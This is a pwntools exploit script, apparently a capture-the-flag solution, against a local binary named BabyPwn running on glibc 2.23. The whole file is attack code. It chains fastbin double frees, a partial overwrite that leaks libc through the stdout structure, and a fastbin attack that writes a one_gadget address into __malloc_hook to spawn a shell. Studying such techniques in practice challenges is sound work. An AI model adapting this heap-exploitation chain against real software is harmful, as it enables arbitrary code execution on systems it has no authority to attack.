from pwn import *
def cmd(c):
	p.sendafter(":",str(c).ljust(4,'\x00'))
def add(size,c="A",name='n132'):
	cmd(1)
	p.sendafter(":",name.ljust(0x10,'\x00'))
	cmd(size)
	p.sendafter(":",c)
def free(idx):
	cmd(2)
	cmd(idx)
context.log_level='debug'
context.arch='amd64'
p=process('./BabyPwn')
add(0x68)#0
add(0x98)#1
add(0x68)#2
add(0x28)#3
free(2)
free(0)
free(2)
free(1)
free(3)
add(0x68,p64(0x60203d))#4
free(3)
add(0x68)
free(3)
add(0x68)#5
free(3)
add(0x68,'\x00'*3+p64(0x00000000006020a0)+p64(0x51)+"\x00"*0x48+p64(0x21)+p64(0x602060)[:3])
add(0x68,'\xdd\x25')#0
add(0x68)#1
add(0x28)#2
add(0x68)#3
free(1)
free(3)
free(1)
add(0x68,'\x00\x31')#4
add(0x68)#5
add(0x68)#6
add(0x68)#7
add(0x68,'\x00'*3+'\x00'*0x30+p64(0x1800)+'\x00'*0x19)#8
p.read(0x40)
base=u64(p.read(8))-(0x7ffff7dd2600-0x7ffff7a0d000)
free(-2)
add(0x48,'\x00'*0x48)
log.warning(hex(base))
add(0x68)#0
add(0x68)#1
free(0)
free(1)
free(0)
one=base+0xf02a4
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
add(0x68,p64(libc.sym['__malloc_hook']+base-35))
add(0x68)
add(0x68)
add(0x68,'\x00'*19+p64(one))
free(1)
free(1)
p.interactive()
